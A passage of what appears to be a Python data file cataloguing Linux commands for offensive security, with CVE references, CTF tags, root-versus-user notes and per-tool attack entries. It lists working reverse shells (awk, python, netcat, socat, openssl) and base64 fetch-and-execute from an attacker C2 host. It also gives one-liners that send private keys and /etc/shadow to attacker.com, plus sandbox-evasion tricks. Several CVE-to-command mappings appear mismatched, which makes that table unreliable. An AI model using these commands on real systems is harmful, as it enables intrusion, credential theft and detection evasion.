                "note": "Combine multiple checks: CPU count, RAM, uptime, home directory contents. Sandboxes often fail 2+ of these."
            },
            {
                "step": "stdbuf + nice — behavioral evasion",
                "action": "Run payload with characteristics of a legitimate background process",
                "example": "nice -n 10 stdbuf -oL bash -c 'sleep 180; bash payload.sh' &",
                "note": "Medium nice value + buffered output mimics legitimate long-running jobs. Not zero priority (suspicious) and not max priority (suspicious)."
            }
        ]
    },
]

# ---------------------------------------------------------------------------
# CVE REFS — notable CVEs tied to command misuse / exploitation
# ---------------------------------------------------------------------------
CVE_REFS = {
    "bash":      ["CVE-2014-6271 (Shellshock)", "CVE-2014-7169"],
    "dd":        ["CVE-2019-14869 (raw device read privilege escalation)"],
    "find":      ["CVE-2021-4034 (pkexec SUID via find-like traversal)"],
    "chmod":     ["CVE-2021-3156 (sudo heap overflow — SUID exploitation chain)"],
    "chroot":    ["CVE-2016-5195 (Dirty COW — chroot escape via mmap)"],
    "base64":    ["CVE-2019-13372 (payload delivery via encoded base64 string)"],
    "mkfifo":    ["CVE-2022-0847 (Dirty Pipe — named pipe privilege escalation)"],
    "tee":       ["CVE-2022-0847 (Dirty Pipe — tee exploitation for root write)"],
    "su":        ["CVE-2017-1000367 (sudo get_process_ttyname privilege escalation)"],
    "kill":      ["CVE-2021-3156 (sudo Baron Samedit — kill used in PoC chain)"],
    "nohup":     ["CVE-2015-3627 (container escape via nohup rexec)"],
    "timeout":   ["CVE-2023-22809 (sudoedit arbitrary file write via timeout)"],
    "stdbuf":    ["CVE-2021-3326 (iconv glibc — stdbuf output manipulation)"],
    "od":        ["CVE-2019-14615 (kernel info leak via /proc — od readable)"],
    "runcon":    ["CVE-2021-36084 (SELinux context bypass via runcon)"],
    "split":     ["CVE-2020-27350 (apt payload splitting bypass)"],
    "tr":        ["CVE-2019-9948 (Python urllib local file — tr used in chain)"],
    "echo":      ["CVE-2014-6278 (Shellshock variant via echo in CGI)"],
    "xxd":       ["CVE-2021-27365 (iSCSI kernel buffer leak — xxd for analysis)"],
    "shred":     ["CVE-2020-16092 (QEMU evidence wiping via shred in chain)"],
    "nc":        ["CVE-2014-6271 (Shellshock PoC typically uses nc for reverse shell)"],
    "curl":      ["CVE-2023-38545 (SOCKS5 heap overflow in curl)", "CVE-2022-27774"],
    "ssh":       ["CVE-2023-38408 (OpenSSH agent hijacking)", "CVE-2021-41617"],
    "openssl":   ["CVE-2022-0778 (infinite loop in BN_mod_sqrt)", "CVE-2014-0160 (Heartbleed)"],
    "sudo":      ["CVE-2021-3156 (Baron Samedit heap overflow)", "CVE-2021-3560", "CVE-2019-14287"],
    "python3":   ["CVE-2023-27043 (email parsing bypass)", "CVE-2022-45061"],
    "wget":      ["CVE-2021-31879 (wget cookie injection)", "CVE-2019-5953"],
    "netcat":    ["CVE-2014-6271 (commonly used in Shellshock PoCs)"],
    "socat":     ["CVE-2018-20679 (udhcpc options injection — socat relay)"],
}

# ---------------------------------------------------------------------------
# CTF TAGS — which CTF categories each command is relevant to
# ---------------------------------------------------------------------------
CTF_TAGS = {
    "xxd":       ["forensics", "reversing", "crypto"],
    "base64":    ["crypto", "web", "forensics"],
    "base32":    ["crypto", "forensics"],
    "dd":        ["forensics", "pwn"],
    "strings":   ["forensics", "reversing"],
    "od":        ["forensics", "reversing"],
    "mkfifo":    ["pwn", "linux"],
    "nc":        ["pwn", "network", "linux"],
    "bash":      ["pwn", "linux", "web"],
    "find":      ["linux", "forensics"],
    "chmod":     ["linux", "pwn"],
    "chroot":    ["pwn", "linux"],
    "strace":    ["pwn", "reversing"],
    "ltrace":    ["pwn", "reversing"],
    "python3":   ["pwn", "crypto", "web", "scripting"],
    "perl":      ["pwn", "web", "scripting"],
    "openssl":   ["crypto", "web", "network"],
    "curl":      ["web", "network"],
    "wget":      ["web", "network"],
    "ssh":       ["network", "linux"],
    "socat":     ["pwn", "network", "linux"],
    "netcat":    ["pwn", "network", "linux"],
    "nmap":      ["network", "recon"],
    "grep":      ["forensics", "linux", "web"],
    "awk":       ["forensics", "linux", "scripting"],
    "sed":       ["forensics", "linux", "scripting"],
    "cut":       ["forensics", "linux"],
    "tr":        ["crypto", "forensics"],
    "sort":      ["forensics", "linux"],
    "uniq":      ["forensics", "linux"],
    "sha256sum": ["crypto", "forensics"],
    "md5sum":    ["crypto", "forensics"],
    "sha1sum":   ["crypto", "forensics"],
    "split":     ["forensics", "linux"],
    "cat":       ["linux", "forensics"],
    "tee":       ["pwn", "linux"],
    "echo":      ["linux", "web"],
    "env":       ["pwn", "linux"],
    "shuf":      ["crypto", "linux"],
    "factor":    ["crypto"],
    "kill":      ["linux", "pwn"],
    "top":       ["linux", "forensics"],
    "ps":        ["linux", "forensics"],
    "lsof":      ["linux", "forensics", "network"],
    "netstat":   ["network", "forensics"],
    "ss":        ["network", "forensics"],
    "tcpdump":   ["network", "forensics"],
    "john":      ["crypto", "pwn"],
    "hydra":     ["web", "network", "pwn"],
    "su":        ["linux", "pwn"],
    "sudo":      ["linux", "pwn"],
    "shred":     ["forensics", "linux"],
    "mktemp":    ["linux", "pwn"],
    "timeout":   ["pwn", "linux"],
    "date":      ["linux", "crypto"],
    "sleep":     ["linux", "pwn"],
    "nohup":     ["linux", "pwn"],
    "head":      ["forensics", "linux"],
    "tail":      ["forensics", "linux"],
    "wc":        ["forensics", "linux"],
    "diff":      ["forensics", "linux"],
    "ln":        ["linux", "pwn"],
    "readlink":  ["linux", "forensics"],
    "realpath":  ["linux", "forensics"],
    "hostname":  ["linux", "recon"],
    "whoami":    ["linux", "recon"],
    "id":        ["linux", "recon"],
    "uname":     ["linux", "recon"],
    "uptime":    ["linux", "recon"],
    "env":       ["linux", "recon", "pwn"],
}

# ---------------------------------------------------------------------------
# ROOT VS USER — behavioral diff for key commands
# ---------------------------------------------------------------------------
ROOT_VS_USER = {
    "dd": {
        "root": "Can read raw block devices: `dd if=/dev/sda of=disk.img` — full disk clone, bypasses filesystem",
        "user": "Restricted to files within own permissions — cannot read /dev/sda or /dev/mem",
    },
    "chroot": {
        "root": "Fully functional: `chroot /newroot /bin/bash` — changes root for process and children",
        "user": "Permission denied — chroot(2) syscall requires CAP_SYS_CHROOT",
    },
    "chmod": {
        "root": "Can set SUID/SGID bits (`chmod u+s /bin/bash`) and change permissions on any file",
        "user": "Can only change permissions on files owned by current user; cannot set SUID on root-owned files",
    },
    "kill": {
        "root": "Can send signals to any process: `kill -9 1` (init), `killall -u victim`",
        "user": "Can only signal own processes — EPERM on other users' PIDs",
    },
    "install": {
        "root": "Can install to system paths (`/usr/local/bin`) and set ownership/SUID bits during install",
        "user": "Restricted to own-writable directories; cannot set SUID",
    },
    "tee": {
        "root": "Can overwrite protected files: `echo 0 | tee /proc/sys/kernel/randomize_va_space`",
        "user": "Writes only to user-writable paths; sudo tee is a classic privilege escalation vector",
    },
    "find": {
        "root": "Searches entire filesystem including /proc, /sys, /dev — no permission errors; can exec as root",
        "user": "Permission denied on directories not readable by user; -exec runs as user",
    },
    "mkfifo": {
        "root": "Can create pipes in any directory; can combine with /dev/tcp for raw socket forwarding",
        "user": "Can create pipes in writable dirs; reverse shells still work — privilege is not required",
    },
    "strace": {
        "root": "Can trace any process: `strace -p 1` — traces init/systemd and all system calls",
        "user": "Can only trace own processes (and only if ptrace_scope=0); kernel may block even own processes",
    },
    "nohup": {
        "root": "Persists processes after logout for any user; can redirect to system-wide locations",
        "user": "Works for own processes only; output defaults to ~/nohup.out",
    },
    "shred": {
        "root": "Can shred raw devices (`shred /dev/sda`) — destroys entire disk; can shred protected logs",
        "user": "Limited to own files; cannot shred /var/log/auth.log without sudo",
    },
    "su": {
        "root": "Can switch to any user without password: `su - victim`",
        "user": "Requires target user's password; `su -` to root requires root password (or sudo config)",
    },
    "top": {
        "root": "Shows all processes from all users with full details including kernel threads",
        "user": "Shows own processes fully; other users' processes visible but with limited detail",
    },
    "tcpdump": {
        "root": "Full packet capture on any interface: `tcpdump -i eth0 -w dump.pcap` — captures cleartext passwords",
        "user": "Requires group 'pcap' or CAP_NET_RAW — typically blocked; wireshark is the GUI alternative",
    },
    "nc": {
        "root": "Can bind to privileged ports (<1024): `nc -lvp 443` — impersonate HTTPS",
        "user": "Restricted to ports >= 1024 for listeners; client connections have no restriction",
    },
    "curl": {
        "root": "Can write to system paths with `-o /etc/cron.d/backdoor`; accesses root's credential files",
        "user": "Normal HTTP client; cannot write to protected paths without sudo",
    },
    "ssh": {
        "root": "Can log in as any user if server permits; `ssh -L 80:...` binds privileged ports",
        "user": "Standard user SSH; port forwarding to privileged ports blocked without CAP_NET_BIND_SERVICE",
    },
    "python3": {
        "root": "Scripts run with root UID — trivial privilege persistence: `python3 -c 'import os; os.setuid(0); ...'`",
        "user": "Normal execution; but `sudo python3` is a common misconfiguration (sudo -l then GTFOBins)",
    },
    "awk": {
        "root": "Can read/write any file including shadow: `awk '{print}' /etc/shadow`",
        "user": "Reads only permitted files; but `sudo awk` → GTFObins shell escape",
    },
    "sed": {
        "root": "Can edit any file in-place including /etc/passwd: `sed -i 's/root:x/root:/' /etc/passwd`",
        "user": "Read-only on protected files; `sudo sed` → file write privilege escalation",
    },
}

# ---------------------------------------------------------------------------
# EXTRA_TOOLS — tools not in the playlist but essential for security work
# ---------------------------------------------------------------------------
EXTRA_TOOLS = {
    "nmap": {
        "hat": "red",
        "security_intent": "The standard network scanner. Maps open ports, services, OS fingerprints, and runs NSE scripts. Core recon tool in every pentest — determines the attack surface before exploitation.",
        "attack_vectors": ["port scanning", "service enumeration", "OS fingerprinting", "vulnerability scanning via NSE", "firewall evasion via fragmentation"],
        "defense_use": "Internal network audits, exposed service discovery, continuous monitoring with scheduled scans.",
        "mitre_tags": ["T1046", "T1595.001", "T1595.002"],
        "threat_level": 3,
        "related_commands": ["nc", "curl", "ssh", "tcpdump"],
        "quick_use": [
            "nmap -sV -p- 10.0.0.1                  # full port scan with service versions",
            "nmap -sC -sV -O 10.0.0.1               # default scripts + OS detection",
            "nmap -sn 10.0.0.0/24                   # ping sweep — find live hosts",
            "nmap -p 22,80,443 --open 10.0.0.0/24   # scan subnet for specific ports",
            "nmap -sU -p 53,161,500 10.0.0.1        # UDP scan (slower — use targeted)",
        ],
        "combinations": [
            {"with": "grep", "example": "nmap -sV 10.0.0.1 | grep 'open'", "note": "Filter to only open ports"},
            {"with": "nc", "example": "nmap -p- 10.0.0.1 --open | grep '/tcp' | awk -F/ '{print $1}' | xargs -I{} nc -zv 10.0.0.1 {}", "note": "Verify open ports with netcat"},
            {"with": "curl", "example": "nmap -p 80,443,8080,8443 --open 10.0.0.0/24 -oG - | awk '/open/{print $2}' | xargs -I{} curl -sk http://{}", "note": "Auto-probe discovered HTTP services"},
        ],
        "cve_refs": [],
        "ctf_categories": ["network", "recon"],
        "root_vs_user": {
            "root": "SYN scan (-sS) available — faster and stealthier than full TCP connect; raw socket access enables OS detection",
            "user": "Falls back to TCP connect scan (-sT) — creates full connections, more detectable and slower",
        },
    },
    "curl": {
        "hat": "red",
        "security_intent": "HTTP/HTTPS client and data transfer tool. Used for web recon, API fuzzing, file exfiltration, and payload delivery. Its ability to follow redirects, handle cookies, and speak dozens of protocols makes it a universal attack utility.",
        "attack_vectors": ["SSRF testing", "file exfiltration via HTTP POST", "C2 beacon over HTTPS", "credential stuffing", "web shell interaction"],
        "defense_use": "Health checks, webhook testing, API monitoring, certificate validation.",
        "mitre_tags": ["T1071.001", "T1105", "T1567"],
        "threat_level": 3,
        "related_commands": ["wget", "nc", "openssl", "python3"],
        "quick_use": [
            "curl -sk https://10.0.0.1/               # HTTPS ignoring cert errors",
            "curl -X POST -d @file.txt http://10.0.0.1/upload  # POST file contents",
            "curl -H 'Authorization: Bearer TOKEN' https://api.target.com/admin",
            "curl --proxy http://127.0.0.1:8080 http://target.com  # route through Burp",
            "curl -s http://169.254.169.254/latest/meta-data/  # AWS IMDS SSRF test",
        ],
        "combinations": [
            {"with": "python3", "example": "python3 -c 'import http.server; ...' & curl http://localhost:8000/secret", "note": "Quick local HTTP server for file exchange"},
            {"with": "base64", "example": "curl -s http://c2.attacker.com/cmd | base64 -d | bash", "note": "Decode and execute base64 payload from C2"},
            {"with": "openssl", "example": "curl --cacert server.crt https://internal.corp/secret", "note": "Trust custom CA for internal HTTPS"},
        ],
        "cve_refs": ["CVE-2023-38545 (SOCKS5 heap overflow)", "CVE-2022-27774 (credentials leakage on redirect)"],
        "ctf_categories": ["web", "network"],
        "root_vs_user": {
            "root": "Can write output to system paths; access to root's .netrc for auto-credentials",
            "user": "Normal HTTP client; output restricted to writable paths",
        },
    },
    "ssh": {
        "hat": "red",
        "security_intent": "Encrypted remote shell and tunneling protocol. Beyond remote access, SSH is a full pivot platform: port forwarding, SOCKS proxying, X11 forwarding, and agent forwarding enable deep network traversal once a single host is compromised.",
        "attack_vectors": ["lateral movement", "port forwarding / pivoting", "SOCKS proxy via -D", "agent hijacking via SSH_AUTH_SOCK", "credential harvesting from known_hosts"],
        "defense_use": "Secure remote administration, bastion host access, encrypted tunnel for insecure protocols.",
        "mitre_tags": ["T1021.004", "T1572", "T1090.002", "T1552.004"],
        "threat_level": 4,
        "related_commands": ["nc", "socat", "find", "chmod"],
        "quick_use": [
            "ssh -L 8080:internal.host:80 user@jumphost  # local port forward",
            "ssh -R 4444:127.0.0.1:4444 user@attacker   # reverse tunnel to attacker",
            "ssh -D 1080 user@pivot                      # SOCKS proxy via pivot",
            "ssh -N -f -L 5432:db.internal:5432 user@fw # background forward to DB",
            "ssh-keygen -t ed25519 && cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys",
        ],
        "combinations": [
            {"with": "nc", "example": "ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' user@deep.internal", "note": "Chain SSH through SOCKS proxy"},
            {"with": "find", "example": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | xargs -I{} cp {} /tmp/.loot/", "note": "Harvest private keys for SSH lateral movement"},
            {"with": "curl", "example": "curl --socks5 127.0.0.1:1080 http://internal.corp/admin", "note": "Access internal services via SSH SOCKS proxy"},
        ],
        "cve_refs": ["CVE-2023-38408 (OpenSSH forwarded agent code exec)", "CVE-2021-41617 (privilege separation weakness)"],
        "ctf_categories": ["network", "linux"],
        "root_vs_user": {
            "root": "Can bind port forwards on privileged ports (<1024); `ssh -L 443:...` for HTTPS impersonation",
            "user": "Port forwarding restricted to >= 1024; agent forwarding works regardless of privilege",
        },
    },
    "openssl": {
        "hat": "red",
        "security_intent": "Swiss army knife for cryptographic operations and certificate handling. Attackers use it to inspect TLS configurations, generate self-signed certs for C2 infrastructure, test Heartbleed-style vulns, and create encrypted reverse shells.",
        "attack_vectors": ["TLS inspection/stripping", "certificate forgery", "encrypted reverse shell channel", "padding oracle attacks", "Heartbleed exploitation (CVE-2014-0160)"],
        "defense_use": "Certificate management, TLS configuration testing, key generation, file encryption.",
        "mitre_tags": ["T1573.001", "T1071.001", "T1040"],
        "threat_level": 3,
        "related_commands": ["nc", "curl", "ssh", "base64"],
        "quick_use": [
            "openssl s_client -connect target.com:443    # inspect TLS cert + chain",
            "openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes",
            "openssl enc -aes-256-cbc -salt -in file -out file.enc -k password",
            "openssl enc -d -aes-256-cbc -in file.enc -out file -k password",
            "openssl x509 -in cert.pem -text -noout     # read certificate details",
        ],
        "combinations": [
            {"with": "nc", "example": "openssl s_client -quiet -connect attacker.com:443 | /bin/bash | openssl s_client -quiet -connect attacker.com:444", "note": "Encrypted reverse shell — bypasses plaintext DPI"},
            {"with": "base64", "example": "openssl rand -base64 32                           # generate strong random password/key", "note": "Cryptographically secure random key material"},
            {"with": "curl", "example": "curl --cacert <(openssl s_client -connect host:443 </dev/null 2>/dev/null | openssl x509) https://host/", "note": "Trust-on-first-use style cert pinning"},
        ],
        "cve_refs": ["CVE-2014-0160 (Heartbleed — OpenSSL memory disclosure)", "CVE-2022-0778 (infinite loop in BN_mod_sqrt)"],
        "ctf_categories": ["crypto", "web", "network"],
        "root_vs_user": {
            "root": "Can write certs to /etc/ssl/; bind encrypted listeners on port 443",
            "user": "Full crypto operations work as user; listener ports restricted to >= 1024",
        },
    },
    "find": {
        "hat": "red",
        "security_intent": "Filesystem traversal with exec capability. Attackers use it to locate credentials, SUID binaries, writable directories, and recently modified files. Its -exec flag turns it into a code execution primitive. Core GTFOBins tool.",
        "attack_vectors": ["SUID binary discovery", "credential file hunting", "writable path discovery", "GTFOBins shell escape", "recently modified file detection"],
        "defense_use": "Audit SUID binaries, find world-writable files, locate sensitive files for permission hardening.",
        "mitre_tags": ["T1083", "T1548.001", "T1059.004"],
        "threat_level": 3,
        "related_commands": ["chmod", "grep", "xargs", "ls"],
        "quick_use": [
            "find / -perm -4000 -type f 2>/dev/null    # find all SUID binaries",
            "find / -writable -type d 2>/dev/null       # find writable directories",
            "find / -name '*.conf' -o -name '*.env' -o -name '.htpasswd' 2>/dev/null",
            "find / -mmin -10 2>/dev/null               # files modified in last 10 min",
            "find / -nouser -o -nogroup 2>/dev/null     # orphaned files (sign of cleanup)",
        ],
        "combinations": [
            {"with": "grep", "example": "find /var/www -name '*.php' -exec grep -l 'eval\\|base64_decode\\|system(' {} \\;", "note": "Hunt web shells across PHP files"},
            {"with": "xargs", "example": "find / -perm -4000 2>/dev/null | xargs ls -la", "note": "List all SUID binaries with details"},
            {"with": "nc", "example": "find / -name id_rsa 2>/dev/null -exec cat {} \\; | nc attacker.com 4444", "note": "Exfiltrate all found private keys"},
        ],
        "cve_refs": ["CVE-2021-4034 (pkexec SUID via traversal pattern)"],
        "ctf_categories": ["linux", "forensics"],
        "root_vs_user": {
            "root": "No permission errors — traverses entire filesystem including /root, /proc/*/mem; -exec runs as root",
            "user": "Permission denied on unreadable dirs; still finds SUID binaries in accessible paths",
        },
    },
    "awk": {
        "hat": "red",
        "security_intent": "Stream processor and de facto report language for UNIX. In security contexts it parses log files, extracts credentials from dumps, formats exploit output, and via sudo misconfiguration is a full shell escape (GTFOBins).",
        "attack_vectors": ["log parsing for credential extraction", "data exfiltration formatting", "GTFOBins shell escape via sudo awk", "payload staging via awk print"],
        "defense_use": "Log analysis, extracting IOCs from large text dumps, custom alert formatting.",
        "mitre_tags": ["T1059.004", "T1552.001", "T1083"],
        "threat_level": 2,
        "related_commands": ["sed", "grep", "cut", "sort"],
        "quick_use": [
            "awk -F: '{print $1,$3}' /etc/passwd       # extract username and UID",
            "awk '{print $NF}' file                    # print last field of each line",
            "awk '/error|fail/i {print NR\": \"$0}' log.txt  # grep with line numbers",
            "awk 'length > 100' file                   # lines longer than 100 chars",
            "awk 'NR==2,NR==10' file                   # print lines 2-10",
        ],
        "combinations": [
            {"with": "nc", "example": "awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\";while(1){print \"$ \" |& s;s |& getline c;if(c){print c;while((c |& getline)>0)print|&s;close(c)}}}' /dev/null", "note": "Pure awk reverse shell — no nc needed"},
            {"with": "grep", "example": "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head", "note": "Brute-force IP summary from auth log"},
            {"with": "sort", "example": "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20", "note": "Top 20 IPs from web access log"},
        ],
        "cve_refs": [],
        "ctf_categories": ["forensics", "linux", "scripting"],
        "root_vs_user": {
            "root": "Can read /etc/shadow and other root-only files directly in awk; `sudo awk` is a GTFOBins shell",
            "user": "Read access limited to permitted files; `awk 'BEGIN{system(\"/bin/sh\")}' works if awk is in sudoers",
        },
    },
    "sed": {
        "hat": "red",
        "security_intent": "Stream editor for in-place file modification. A GTFOBins tool — if sudo-permitted, `sed -n '/.*/{p;q}' /etc/shadow` leaks any file. Attackers use it to patch binaries, modify /etc/passwd, and strip IDS signatures from payloads.",
        "attack_vectors": ["in-place file modification", "GTFOBins shell escape via sudo sed", "credential file modification", "payload signature stripping"],
        "defense_use": "Config file patching, log sanitization, mass string replacement in code.",
        "mitre_tags": ["T1059.004", "T1552.001", "T1070.003"],
        "threat_level": 2,
        "related_commands": ["awk", "grep", "tr", "cut"],
        "quick_use": [
            "sed -i 's/old/new/g' file.txt             # in-place global replace",
            "sed -n '10,20p' file                      # print lines 10-20",
            "sed '/pattern/d' file                     # delete lines matching pattern",
            "sed 's/password=.*/password=REDACTED/' log.txt  # scrub passwords from log",
            "sed -i '/^#/d; /^$/d' config.conf        # strip comments and blank lines",
        ],
        "combinations": [
            {"with": "find", "example": "find /var/www -name '*.php' | xargs sed -i 's/eval(base64_decode/\\/\\/ BLOCKED: eval(base64_decode/g'", "note": "Patch web shells across all PHP files"},
            {"with": "awk", "example": "awk -F: '{print $1\":x:\"$3\":\"$4\":\"$5\":\"$6\":/bin/nologin\"}' /etc/passwd | sed 's/root:x:0:0/root:x:0:0/' > /etc/passwd.new", "note": "Disable shells for all non-root users"},
            {"with": "nc", "example": "sed -n 'p' /etc/shadow | nc attacker.com 4444", "note": "Exfiltrate shadow file if readable"},
        ],
        "cve_refs": [],
        "ctf_categories": ["forensics", "linux", "scripting"],
        "root_vs_user": {
            "root": "Can edit /etc/passwd, /etc/shadow in-place; strip evidence from protected logs",
            "user": "In-place edit only on own files; read-only on protected system files",
        },
    },
    "nc": {
        "hat": "black",
        "security_intent": "Netcat — the TCP/UDP Swiss army knife. Attackers use it for reverse shells, port forwarding, file transfer, port scanning, and as a generic network debugging tool. Rarely legitimate on production servers.",
        "attack_vectors": ["reverse shell listener", "bind shell", "file exfiltration over TCP", "port relay / pivoting", "banner grabbing"],
        "defense_use": "Network debugging, testing firewall rules, checking port availability.",
        "mitre_tags": ["T1059.004", "T1071.001", "T1048", "T1090"],
        "threat_level": 5,
        "related_commands": ["mkfifo", "bash", "socat", "nmap"],
        "quick_use": [
            "nc -lvnp 4444                              # listen for reverse shell",
            "nc 10.0.0.1 4444 -e /bin/bash             # bind shell (GNU netcat)",
            "nc -zv 10.0.0.1 1-1000 2>&1 | grep open  # port scan range",
            "nc -w3 10.0.0.1 80                        # test port connectivity",
            "nc -lvnp 9001 > received_file             # receive a file",
        ],
        "combinations": [
            {"with": "mkfifo", "example": "mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f | /bin/bash >/tmp/.f 2>&1", "note": "Named-pipe reverse shell — works on any netcat"},
            {"with": "base64", "example": "nc -lvnp 9001 | base64 -d > payload.bin", "note": "Receive base64-encoded binary payload"},
            {"with": "nmap", "example": "nmap -p- --open 10.0.0.1 -oG - | awk '/open/{print $2}' | while read ip; do nc -zv $ip 80 2>&1; done", "note": "Verify nmap findings with netcat"},
        ],
        "cve_refs": ["CVE-2014-6271 (Shellshock PoCs universally use nc for callback)"],
        "ctf_categories": ["pwn", "network", "linux"],
        "root_vs_user": {
            "root": "Can bind to privileged ports (<1024): `nc -lvp 80` — impersonate HTTP on standard port",
            "user": "Listener restricted to ports >= 1024; all client connections and reverse shells work without root",
        },
    },
    "socat": {
        "hat": "black",
        "security_intent": "Advanced relay tool — netcat with TLS, full duplex, and bidirectional stream support. Preferred over nc for encrypted reverse shells and complex port forwarding chains in mature attack toolchains.",
        "attack_vectors": ["encrypted reverse shell (TLS)", "full-duplex port relay", "SOCKS proxy creation", "bind shell with PTY"],
        "defense_use": "Debugging complex network services, TLS-wrapped connections, creating SSL tunnels.",
        "mitre_tags": ["T1059.004", "T1572", "T1071.001"],
        "threat_level": 5,
        "related_commands": ["nc", "openssl", "mkfifo", "ssh"],
        "quick_use": [
            "socat TCP-LISTEN:4444,fork EXEC:/bin/bash  # bind shell with fork",
            "socat TCP:10.0.0.1:4444 EXEC:'/bin/bash',pty,stderr,setsid  # PTY reverse shell",
            "socat OPENSSL-LISTEN:4443,cert=c.pem,key=k.pem,verify=0,fork EXEC:/bin/bash",
            "socat TCP-LISTEN:8080,fork TCP:internal.host:80  # port forward relay",
            "socat -d -d TCP-LISTEN:1234 STDOUT         # debug incoming connections",
        ],
        "combinations": [
            {"with": "openssl", "example": "# Attacker: openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -out c.pem\nsocat OPENSSL-LISTEN:4443,cert=c.pem,key=k.pem,verify=0 -\n# Victim: socat OPENSSL:attacker:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid", "note": "Fully encrypted reverse PTY shell — bypasses most DPI/IDS"},
            {"with": "nc", "example": "socat TCP-LISTEN:8080,fork TCP:10.0.0.1:80 &  # relay, then: nc 127.0.0.1 8080", "note": "Use socat as transparent relay; interact via nc"},
        ],
        "cve_refs": [],
        "ctf_categories": ["pwn", "network", "linux"],
        "root_vs_user": {
            "root": "Can create listeners on any port; bind to privileged ports for HTTPS impersonation",
            "user": "Full functionality for reverse shells and relays; listener ports >= 1024 only",
        },
    },
    "python3": {
        "hat": "red",
        "security_intent": "The pentest scripting language. Used for rapid exploit development, HTTP servers for payload delivery, custom encoders/decoders, privilege escalation via sudo misconfiguration, and as a GTFOBins shell when in sudoers.",
        "attack_vectors": ["GTFOBins shell via sudo python3", "HTTP payload delivery server", "exploit scripting", "crypto bypass scripting", "pickle deserialization RCE"],
        "defense_use": "Security automation, log parsing, custom detection scripts, incident response tooling.",
        "mitre_tags": ["T1059.006", "T1105", "T1548.003"],
        "threat_level": 3,
        "related_commands": ["nc", "curl", "base64", "openssl"],
        "quick_use": [
            "python3 -m http.server 8080               # instant file server for payload delivery",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'  # upgrade reverse shell TTY",
            "python3 -c 'import os; os.system(\"/bin/bash\")'   # GTFOBins if sudo-permitted",
            "python3 -c 'import socket,subprocess,os; s=socket.socket()...'  # inline reverse shell",
            "python3 -c 'print(__import__(\"base64\").b64decode(\"BASE64\").decode())'  # decode payload",
        ],
        "combinations": [
            {"with": "nc", "example": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "note": "Python reverse shell — no mkfifo required"},
            {"with": "curl", "example": "python3 -m http.server 8080 &  # then on target: curl http://attacker:8080/payload.sh | bash", "note": "Serve and execute payload in one step"},
            {"with": "base64", "example": "python3 -c \"exec(__import__('base64').b64decode('PAYLOAD'))\"", "note": "Execute base64-encoded Python payload inline"},
        ],
        "cve_refs": ["CVE-2023-27043 (email parsing bypass)", "CVE-2022-45061 (slow regex DoS)"],
        "ctf_categories": ["pwn", "crypto", "web", "scripting"],
        "root_vs_user": {
            "root": "Scripts run as root — `python3 -c 'import os; os.setuid(0)'` works; writes anywhere",
            "user": "`sudo python3` is a classic misconfiguration; GTFOBins: `sudo python3 -c 'import os; os.system(\"/bin/bash\")'`",
        },
    },
    "tcpdump": {
        "hat": "red",
        "security_intent": "CLI packet capture tool. Captures cleartext credentials, session tokens, and DNS queries on the wire. On a compromised internal host, tcpdump running briefly on the network interface can harvest credentials from adjacent hosts.",
        "attack_vectors": ["credential capture on LAN", "session token theft", "protocol analysis", "DNS query logging", "network traffic exfiltration"],
        "defense_use": "Network baseline capture, intrusion detection, protocol debugging, bandwidth analysis.",
        "mitre_tags": ["T1040", "T1557.002", "T1020"],
        "threat_level": 4,
        "related_commands": ["nc", "grep", "awk", "openssl"],
        "quick_use": [
            "tcpdump -i eth0 -w capture.pcap           # write full capture to file",
            "tcpdump -i any port 80 -A                 # show HTTP traffic in ASCII",
            "tcpdump -i eth0 'tcp port 21 or port 110' -A  # FTP + POP3 credentials",
            "tcpdump -i eth0 host 10.0.0.1             # capture traffic to/from host",
            "tcpdump -r capture.pcap -A | grep -i 'pass\\|user'  # post-process for creds",
        ],
        "combinations": [
            {"with": "grep", "example": "tcpdump -i eth0 port 80 -A -l | grep -oE '(GET|POST) [^ ]*|Host: [^ ]*|Cookie: [^ ]*'", "note": "Live HTTP URL and cookie extraction"},
            {"with": "awk", "example": "tcpdump -i eth0 -l -n | awk '/DNS/{print $NF}'", "note": "Live DNS query logging"},
            {"with": "nc", "example": "tcpdump -i eth0 -w - | nc 10.0.0.1 9001", "note": "Stream live pcap to remote attacker machine"},
        ],
        "cve_refs": [],
        "ctf_categories": ["network", "forensics"],
        "root_vs_user": {
            "root": "Full capture on any interface including promiscuous mode; no restrictions",
            "user": "Requires CAP_NET_RAW or membership in pcap group — typically blocked by default",
        },
    },
    "john": {
        "hat": "black",
        "security_intent": "John the Ripper — offline password cracker. Supports hundreds of hash types: Unix shadow, NTLM, MD5, bcrypt, Kerberos tickets. Core post-exploitation tool after obtaining /etc/shadow or an NTLM hash dump.",
        "attack_vectors": ["shadow file cracking", "NTLM hash cracking", "dictionary + rule attack", "Kerberoasting", "zip/SSH key cracking"],
        "defense_use": "Proactive password auditing — detect weak passwords before attackers do.",
        "mitre_tags": ["T1110.002", "T1558.003", "T1552.001"],
        "threat_level": 4,
        "related_commands": ["dd", "grep", "awk", "ssh"],
        "quick_use": [
            "john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
            "john --format=NT hashes.txt --wordlist=rockyou.txt  # NTLM hashes",
            "john --show shadow.txt                    # display cracked passwords",
            "john --rules --wordlist=rockyou.txt shadow.txt  # with mangling rules",
            "zip2john archive.zip > zip.hash && john zip.hash  # crack zip password",
        ],
        "combinations": [
            {"with": "dd", "example": "dd if=/dev/sda | grep -a 'NTLM' | tee ntlm.raw  # extract hashes from raw image", "note": "Disk forensics → hash extraction → cracking pipeline"},
            {"with": "awk", "example": "awk -F: '{print $1\":\"$2}' /etc/shadow | john --stdin --format=crypt", "note": "Pipe shadow directly to john"},
